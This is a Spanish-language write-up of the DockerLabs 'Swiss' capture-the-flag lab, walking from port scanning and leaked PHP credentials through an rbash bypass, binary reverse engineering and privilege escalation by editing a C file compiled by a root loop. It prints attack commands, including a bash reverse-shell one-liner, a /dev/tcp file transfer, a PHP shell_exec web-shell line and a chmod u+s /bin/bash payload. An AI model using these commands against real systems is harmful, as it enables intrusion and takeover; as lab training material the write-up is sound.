---
title: DockerLabs - Swiss
summary: "Write-up del laboratorio Swiss de DockerLabs"
author: elcybercurioso
date: 2026-01-04
categories: [Post, DockerLabs]
tags: [medio, credentials leaking, ssh, restricted bash, process snooping, reverse engineering, permissions abuse]
media_subpath: "/assets/img/posts/dockerlabs_swiss"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ nmap -sCV -p22,80 172.17.0.2
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 cc:70:cb:29:31:d9:48:f7:e2:2f:ec:b2:65:8c:ee:8e (ED25519)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x91\x8B Mario \xC3\x81lvarez Fer\xC5\x84andez
```

## análisis

Comenzamos revisando el puerto 80 de la máquina, donde no encontramos nada que nos dé un pista de por donde seguir:

![Desktop View](/20251120200249.webp){: width="972" height="589" .shadow}

Por ello, procedemos a buscar recursos disponibles en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/index.php            (Status: 200) [Size: 22274]
/scripts              (Status: 301) [Size: 310] [--> http://172.17.0.2/scripts/]
/server-status        (Status: 403) [Size: 275]
/credentials.txt      (Status: 200) [Size: 15677440]
```

El recurso **/credentials.txt** parece prometedor, por lo que tratamos de listar su contenido, pero veremos que no es posible, ya que su tamaño excede a lo que nos permite ver por consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ curl -s 'http://172.17.0.2/credentials.txt' | cat
docencia/0000755000000000000000000000000014714117617011332 5ustar  rootrootdocencia/styles.css0000644000000000000000000003030414714117067013366 0ustar  rootroot* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow-x: hidden;
    font-family: 'Fira Code', monospace; /* Aplica Fira Code a todo el cuerpo */
```

Así que lo que haremos es guardar todo lo que nos envía el servidor al hacer una petición sobre **/credentials.txt** en un fichero que posteriormente analizaremos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ curl -s 'http://172.17.0.2/credentials.txt' --output result
```

Al ejecutar el comando **file** sobre el fichero resultante, veremos que nos indica que se trata de un comprimido:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ file result
result: POSIX tar archive (GNU)
```

Por ello, le agregamos la extensión que le corresponde:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ mv result result.tar
```

Y tratamos de descomprimirlo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ tar -xf result.tar
```

Listamos lo que nos ha obtenido:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ tree              
.
├── allPorts
├── docencia
│   ├── index.php
│   └── styles.css
├── images
│   ├── 4k4m1m3.png
│   ├── academia.png
│   ├── ballena.jpg
│   ├── bash.png
│   ├── css.png
│   ├── discord.png
│   ├── docker.png
│   ├── docker.webp
│   ├── html.png
│   ├── java.webp
│   ├── jordi.jpeg
│   ├── js.png
│   ├── kali.png
│   ├── mongo.svg
│   ├── pinguino.png
│   ├── presentacion.mp4
│   ├── pylon.webp
│   ├── python.webp
│   ├── redes.png
│   ├── ren.jpg
│   ├── secure.png
│   ├── sql.png
│   ├── telegram.webp
│   ├── token
│   ├── tux.webp
│   └── yo3.JPG
├── index.php
├── result.tar
├── scripts
│   ├── popup.js
│   ├── script.js
│   └── ver-mas.js
├── sobre-mi
│   ├── confidencial.php
│   ├── index.php
│   ├── login.php
│   ├── logout.php
│   ├── pinguino.png
│   ├── sms.php
│   ├── styles.css
│   ├── yo.jpg
│   └── yoo.jpg
└── styles.css

5 directories, 44 files
```

Revisamos el fichero `token`, el cual parece que puede tener alguna cosa que nos podría servir, pero vemos que se trata de un rabbit hole:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ file images/token 
images/token: Unicode text, UTF-8 text

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ cat images/token             
aquí no hay nada jiji
```

Otro fichero prometedor es el **login.php**, el cual vemos que tiene las credenciales de acceso hardcodeadas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ cat sobre-mi/login.php       
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Autenticación simple (esto debería hacerse contra una base de datos en un entorno de producción)
    if ($username == 'administrator' && $password == 'p******') {
        // Generar un valor aleatorio para la cookie
        $random_value = bin2hex(random_bytes(16));

        // Crear una cookie con el valor aleatorio, expira en 1 hora
        setcookie('session_id', $random_value, time() + 600, "/");

        // Almacenar el valor aleatorio junto con el nombre de usuario (esto debería hacerse en una base de datos en un entorno de producción)
        // Aquí estamos usando una sesión de ejemplo
        session_start();
        $_SESSION['session_id'] = $random_value;
        $_SESSION['username'] = $username;

        // Redirigir al inicio
        header('Location: sms.php');
    } else {
        echo "Usuario o contraseña incorrectos.";
    }
} else {
    header('Location: sms.php');
}
?>
```

Teniendo las credenciales de acceso del usuario `administrator`, vamos al script **/sms.php** y nos logueamos:

![Desktop View](/20251120203524.webp){: width="972" height="589" .shadow}

Tras acceder, vemos que hay un mensaje que nos facilita unas credenciales de SSH:

![Desktop View](/20251120203645.webp){: width="972" height="589" .shadow}

En el fichero **confidencial.php** que hemos obtenido del comprimido anteriormente podemos encontrar las mismas credenciales:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ cat sobre-mi/confidencial.php 
<!DOCTYPE html>
<html lang="es">
<head>
    ...
</head>
<body>
    <?php
    // Iniciar sesión
    session_start();

    // Verificar si el usuario ya está autenticado
    if (isset($_COOKIE['session_id']) && isset($_SESSION['session_id']) && $_COOKIE['session_id'] === $_SESSION['session_id']) {
        echo "<div class='login-container'><h2>Darks, el sistema a sido configurado para restringir un rango de ip por seguridad, ten esto en cuenta ya que si no te encuentras en el segmento correcto nada funcionara, tus nuevas credenciales ssh son: darks:_****************** </h2></div>";
    } else {
        header('Location: sms.php');
    }
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    ?>
</body>
</html>
```

## acceso inicial (darks)

En el mensaje nos indicaban que, aún teniendo las credenciales de acceso por SSH, se ha configurado el servidor para que únicamente acepte conexiones de cierto rango de IPs, por lo que debemos ir permutando entre todas las combinaciones hasta dar con una IP que nos permita acceder.

Por ello, para automatizar la tarea de probar cada IP dentro del rango 172.17.0.1-172.17.0.254, usaremos el siguiente script que se encargará de cambiar la IP de nuestra máquina empleando el comando **ip**:

```bash
#!/bin/bash  
  
# El prefijo de red del laboratorio  
network_prefix="172.17.0"  
  
# Recorre las IPs del 1 al 254  
for host in {1..254}; do  
ip="$network_prefix.$host"  
# Abrir una consola Bash en el caso de que sea una IP que pase la restricción  
sshpass -p '<LA PASS DE DARKS VA AQUÍ>' ssh -o StrictHostKeyChecking=no darks@172.17.0.2 "export ip=$ip;echo \"Probando IP: $ip\";bash"  
# Si no lo hace, probar la siguiente IP  
if [ $? -ne 0 ]; then  
next_ip="$network_prefix.$(expr $host + 1)"  
ip a del $ip/16 dev docker0  
ip a add $next_ip/16 dev docker0  
last_ip=$next_ip  
# Si lo encuentra, indicarlo al salir de la consola Bash y terminar  
else  
echo "IP con acceso permitio a SSH: $ip"  
break  
fi  
done  
  
# Imprimir instrucciones para establecer la IP original a la interfaz docker0  
echo "~~ Una vez terminado el laboratorio, ejecutar los siguientes comandos para restablecer la IP de la interfaz docker0 ~~"  
echo "ip a del $last_ip/16 dev docker0"  
echo "ip a add 172.17.0.1/16 dev docker0"
```

Ejecutamos el script (con permisos SUDO), y veremos que probará múltiples IPs hasta llegar a cierta IP, en la se parará y nos permitirá ejecutar comandos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ sudo ./ssh_tester.sh            
Probando IP: 172.17.0.1
Read from remote host 172.17.0.2: Connection reset by peer
client_loop: send disconnect: Broken pipe
ssh: connect to host 172.17.0.2 port 22: Connection refused
Connection reset by 172.17.0.2 port 22
...
Probando IP: 172.17.0.151
id
uid=1001(darks) gid=1001(darks) groups=1001(darks)
hostname -I
172.17.0.2
```

Por un breve periodo de tiempo podremos invocar una bash, pero nos la cerrarán tras un rato, ya que hay un proceso que cierra las consolas que no cumplan ciertas características:

```bash
id
uid=1001(darks) gid=1001(darks) groups=1001(darks)
bash -i
bin  mensaje.txt
darks@a7bed720c3c4:~$ cat mensaje.txt 
Hola Darks, soy el administrador del sistema y he restringido tu acceso al servidor por un fallo de seguridad que estamos resolviendo, cuando se resuelva te regresamos el acceso
darks@a7bed720c3c4:~$ bash: line 2: 12329 Killed                  bash -i
```

Dado que podemos ejecutar comandos, revisamos cuales son los usuarios del sistema:

```bash
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
darks:x:1001:1001::/home/darks:/bin/rbash
cristal:x:1002:1002:,,,:/home/cristal:/bin/bash
```

Ya que hemos podido encontrar la IP con la que la máquina nos permite acceder, podremos hacerlo nuevamente, pero esta vez de la manera normal (usando **sshpass** para no proporcionar la contraseña cada vez que queremos acceder, y **ssh** para establecer la conexión):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ sshpass -p "_*****************" ssh darks@172.17.0.2
darks@a7bed720c3c4:~$ ls
bin  mensaje.txt
```

Sin embargo, vemos que la mayoría de comandos no nos permiten ejecutarlos:

```bash
darks@a7bed720c3c4:~$ env
-rbash: env: command not found
```

Como habíamos visto antes al listar el contenido del fichero `/etc/passwd`, el usuario `darks` tiene asignada un **rbash**, lo que nos bloquea la mayoría de comandos:

```bash
darks@a7bed720c3c4:~$ cat /etc/passwd
...
darks:x:1001:1001::/home/darks:/bin/rbash
...
```

Pero se puede saltar esta configuración de manera sencilla indicando el comando que queremos que se ejecute antes de que nos otorguen una consola al acceder por SSH de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ ssh darks@172.17.0.2 "bash"
darks@172.17.0.2`s password: 
id
uid=1001(darks) gid=1001(darks) groups=1001(darks)
```

## movimiento lateral (cristal)

Habiéndonos saltado esta restricción, ahora podemos invocar una consola interactiva (aunque seguimos teniendo ciertas restricciones, como que al tratar de cerrar un proceso con **Ctrl+C** se cierra la consola):

```bash
tty
not a tty
script -c bash /dev/null
Script started, output log file is '/dev/null'.
darks@a7bed720c3c4:~$ tty
tty
/dev/pts/4
```

Ahora buscaremos procesos que se puedan estar ejecutando en segundo plano que tengan que ver con la usuario `cristal`, a la cual querremos movernos lateralmente:

```bash
darks@a7bed720c3c4:/home$ ps -aux | grep cristal
ps -aux | grep cristal
root          36  0.0  0.0   4324  3348 ?        S    15:04   0:01 /bin/bash /home/cristal/systm.sh
darks      15474  0.0  0.0   3956  2044 pts/4    S+   17:27   0:00 grep --color=auto cristal
```

Dado que el script que encontramos podría estar ejecutándose a intervalos regulares de tiempo, vamos a interceptar los procesos del sistema con la herramienta **[pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)**, la cual debemos transferir a la máquina, por ejemplo, abriendo un servidor con Python:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ ls           
pspy64

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la máquina lo descargamos, y le damos permisos de ejecución:

```bash
darks@a7bed720c3c4:/tmp$ wget http://172.17.0.151/pspy64
wget http://172.17.0.151/pspy64
Connecting to 172.17.0.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  --.-KB/s    in 0.01s   

darks@a7bed720c3c4:/tmp$ ls 
ls
pspy64  registros.log
darks@a7bed720c3c4:/tmp$ chmod +x pspy64
chmod +x pspy64
```

Pasados unos segundo, veremos que interceptamos la ejecución con permisos `root` del script que encontramos antes:

```bash
darks@a7bed720c3c4:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Draining file system events due to startup...
done
2025/XX/XX XX:XX:XX CMD: UID=0     PID=36     | /bin/bash /home/cristal/systm.sh 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=35     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=24     | /usr/sbin/apache2 -k start 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=1      | /bin/bash /usr/local/bin/start.sh 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18354  | /bin/bash /root/kill.sh 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18358  | /bin/bash /root/kill.sh 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18357  | /bin/bash /root/kill.sh 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18356  | grep -E /bin/zsh -c |zsh -c |zsh -i |/bin/zsh -i |/bin/bash -c |/bin/bash -i |bash -c |bash -i |/bin/sh -i |/bin/sh -c |sh -c |sh -i 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18355  | grep -Ev root |color 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18360  | xargs kill -9 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18361  | sleep 10 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18362  | 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18363  | /usr/libexec/gcc/x86_64-linux-gnu/13/cc1 -quiet -imultiarch x86_64-linux-gnu /home/cristal/systm.c -quiet -dumpdir /home/cristal/syst- -dumpbase systm.c -dumpbase-ext .c -mtune=generic -march=x86-64 -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection -fcf-protection -o /tmp/ccNtnJ4b.s                                 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18364  | gcc -o /home/cristal/syst /home/cristal/systm.c 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18365  | /usr/libexec/gcc/x86_64-linux-gnu/13/collect2 -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/ccCKenxP.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /home/cristal/syst /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/13 -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/13/../../.. /tmp/ccQaG3TK.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o                                                                                                                                                                                                                 
2025/XX/XX XX:XX:XX CMD: UID=0     PID=18366  | /usr/libexec/gcc/x86_64-linux-gnu/13/collect2 -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/ccCKenxP.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /home/cristal/syst /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/13 -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/13/../../.. /tmp/ccQaG3TK.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o                                                                                                                                                                                                                 
```

Nos indican que se está ejecutando **gcc** (que si nos fijamos, es el único al que se le llama de forma relativa), y comprobamos si se trata de un enlace simbólico a otro binario (confirmaremos que así es):

```bash
darks@a7bed720c3c4:~$ which gcc
which gcc
/usr/bin/gcc
darks@a7bed720c3c4:~$ ls -la /usr/bin/gcc
ls -la /usr/bin/gcc
lrwxrwxrwx 1 root root 6 Jan 31  2024 /usr/bin/gcc -> gcc-13
```

Esta información nos permitirá más adelante avanzar.

Por ahora seguiremos avanzando en el análisis de la máquina, en este caso buscando binarios, los cuales tengamos permisos de ejecución:

```bash
darks@a7bed720c3c4:~$ find / -executable 2>/dev/null | grep -vE '/proc|/sys|/bin|/dev|/etc|/var/lib|/usr|/run|/var/cache'
find / -executable 2>/dev/null | grep -vE '/proc|/sys|/bin|/dev|/etc|/var/lib|/usr|/run'
...
/var/www/sendinv2
...
```

Un binario que salta a la vista es `/var/www/sendinv2`. Al revisar sus permisos, vemos que cualquiera puede leer y ejecutar dicho binario:

```bash
darks@a7bed720c3c4:~$ ls -la /var/www/sendinv2
ls -la /var/www/sendinv2
-rwxr-xr-x 1 www-data www-data 16464 Nov 12  2024 /var/www/sendinv2
```

Por lo tanto, lo que haremos será enviarlo a nuestra máquina para poder analizarlo a bajo nivel empleando ingeniería inversa (con herramientas como **ghidra**).

Nos ponemos en escucha con **nc**, y lo que recibamos lo redirigiremos a un fichero:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ nc -lvp 7878 > sendinv2
listening on [any] 7878 ...
```

Desde la máquina víctima enviamos el binario `sendinv2`:

```bash
darks@a7bed720c3c4:~$ cat /var/www/sendinv2 > /dev/tcp/172.17.0.151/7878
cat /var/www/sendinv2 > /dev/tcp/172.17.0.151/7878
```

Comprobaremos que el contenido ha llegado íntegro usando **md5sum** (en caso de que los hashes coincidan, sabremos que se ha transferido correctamente):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ md5sum sendinv2        
6f2c7356b62cd9c4fffae77dd67e0142  sendinv2
```

```bash
darks@a7bed720c3c4:~$ md5sum /var/www/sendinv2
md5sum /var/www/sendinv2
6f2c7356b62cd9c4fffae77dd67e0142  /var/www/sendinv2
```

Procedemos a abrir el binario con **ghidra**, y analizamos la función **main**, donde vemos que hay indicada una IP y un puerto (el cual debemos desencriptar, ya que está en formato hexadecimal):

![Desktop View](/20251222160228.webp){: width="972" height="589" .shadow}

Al desencriptar el puerto, vemos que se trata del puerto **7777**:

![Desktop View](/20251222155712.webp){: width="972" height="589" .shadow}

Viendo que se está conectando a la IP 172.17.0.188, procedemos a cambiar nuestra IP para que coincida y nos ponemos en escucha por el puerto 7777 con **nc**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ ip a show docker0                   
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.151/16 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 xxxx::xx:xxxx:xxxx:xxxx/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ sudo ip a del 172.17.0.151/16 dev docker0

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ sudo ip a add 172.17.0.188/16 dev docker0

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ ip a show docker0                        
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.188/16 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 xxxx::xx:xxxx:xxxx:xxxx/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ nc -nlvp 7777          
listening on [any] 7777 ...
```

Ahora vamos a ejecutar el binario **sendinv2**:

```bash
darks@a7bed720c3c4:~$ cd /var/www
cd /var/www
darks@a7bed720c3c4:/var/www$ ./sendinv2
./sendinv2
```

Sin embargo, vemos que no recibimos nada, por lo que nos ponemos en escucha por UDP en vez de por TCP, y vemos que tras ejecutar nuevamente el binario, recibimos una cadena codificada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ nc -ulp 7777
<texto codificado>
```

Podemos pensar que se trata de Base64, pero vemos que al tratar de decodificarla, el contenido no es legible, y con los magic number tampoco detectamos que se esté tratando de un fichero:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ echo "<texto codificado>" | base64 -d
0P�K��(Ж9�R]�͍3�E;��,�TP��#�9B�<H��!AB�$Qp�5��A��^DI�9Q9T�,FTS��$FA�� ��▒͒5DI �5V�d�0���,G1"�]�I �8E8��$P�+`�#��9d�)T�    VU▒EA$�0�9��#��9b�4��4V�R�1�cp�,G0$�4PFQ��5F!�8���D�0�Td�#�Q��]���<����$P�靶#��Qd�$�!�$�@base64: invalid input

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ echo "<texto codificado>" | base64 -d > texto_codificado
base64: invalid input

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ file texto_codificado        
file: data
```

Por ello, empleamos la herramienta [cyberchef.io](https://cyberchef.io/) para tratar de descubrir que codificación tiene, y nos indica que se está empleando Base64 en primer lugar y luego Base32, por lo que hacemos el proceso inverso para obtener el mensaje oculto:

![Desktop View](/20251224151437.webp){: width="972" height="589" .shadow}

Nos indican lo que parecen ser unas credenciales, por lo que probamos a acceder por SSH, y vemos que son correctas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Swiss]
└─$ sshpass -p "*****************" ssh cristal@172.17.0.2
cristal@a7bed720c3c4:~$ hostname
a7bed720c3c4
cristal@a7bed720c3c4:~$ id
uid=1002(cristal) gid=1002(cristal) groups=1002(cristal),100(users),1003(editor)
```

## escalada de privilegios (root)

En el directorio del usuario `cristal` encontramos un script que, al ejecutarse, compila un script en C, el cual ya vimos anteriormente con **pspy64**:

```bash
cristal@a7bed720c3c4:~$ cat systm.sh 
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```

Viendo los permisos que tiene el script **systm.c**, nos daremos cuenta de que los usuarios que pertenecen al grupo `editor` pueden modificarlo:

```bash
cristal@a7bed720c3c4:~$ ls -la /home/cristal/systm.c
-rw-rw-r-- 1 root editor 1516 Nov 11  2024 /home/cristal/systm.c
```

```bash
cristal@a7bed720c3c4:~$ cat systm.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <time.h>

void log_system_info(const char *filename) {
    FILE *log_file = fopen(filename, "a");
    if (log_file == NULL) {
        perror("Error al abrir el archivo de log");
        exit(EXIT_FAILURE);
    }

    // Información del sistema
    struct utsname sys_info;
    if (uname(&sys_info) < 0) {
        perror("Error al obtener información del sistema");
        exit(EXIT_FAILURE);
    }

    // Tiempo de inicio del sistema
    struct timespec uptime;
    if (clock_gettime(CLOCK_BOOTTIME, &uptime) < 0) {
        perror("Error al obtener el tiempo de inicio del sistema");
        exit(EXIT_FAILURE);
    }
    time_t boot_time = time(NULL) - uptime.tv_sec;

    // Escribir la información en el archivo de log
    fprintf(log_file, "-----------------------------\n");
    fprintf(log_file, "Fecha y Hora: %s", ctime(&boot_time));
    fprintf(log_file, "Nombre del Sistema: %s\n", sys_info.sysname);
    fprintf(log_file, "Nombre del Host: %s\n", sys_info.nodename);
    fprintf(log_file, "Versión del Sistema: %s\n", sys_info.release);
    fprintf(log_file, "Versión del Kernel: %s\n", sys_info.version);
    fprintf(log_file, "Arquitectura de Hardware: %s\n", sys_info.machine);
    fprintf(log_file, "-----------------------------\n");

    fclose(log_file);
}

int main() {
    const char *log_filename = "/tmp/registros.log";

    log_system_info(log_filename);

    return 0;
}
```

Ya que la usuaria `cristal` pertenece a dicho grupo, podemos modificar este script, y dado que la tarea cron está compilando el script y ejecutando el binario resultante, podemos ejecutar comandos con privilegios de administrador en la máquina.

El método que utilizaremos para obtener una consola como `root` será **modificando los permisos del binario `/bin/bash`**. Sin embargo, también se puede **enviar una consola privilegiada a nuestra máquina**, y recibirla con **nc** ejecutando el siguiente comando en C:

```bash
system("/bin/bash -c '/bin/bash -i >& /dev/tcp/172.17.0.188/1337 0>&1'");
```

Lo primero es comprobar los permisos actuales del binario `/bin/bash`, donde vemos que no es **SUID** (permite ejecutar un binario con los permisos del propietario):

```bash
cristal@a7bed720c3c4:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora procedemos a modificar el script `systm.c`, agregando el comando `system(...)`, el cual se encargará de ejecutar lo que le indiquemos como parámetro:

```bash
cristal@a7bed720c3c4:~$ cat systm.c
...
int main() {
    const char *log_filename = "/tmp/registros.log";

    log_system_info(log_filename);
    system("/bin/bash -c 'chmod u+s /bin/bash'"); // Aquí indicaremos el comando que queremos ejecutar como root
    return 0;
}
```

Esperamos a que se ejecute la tarea cron, y volvemos a revisar los permisos del binario `/bin/bash`:

```bash
cristal@a7bed720c3c4:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Viendo que ya tiene permisos **SUID**, invocamos una consola privilegiada:

```bash
cristal@a7bed720c3c4:~$ bash -p
bash-5.2# whoami
root
```

De esta manera, habremos completado el laboratorio!




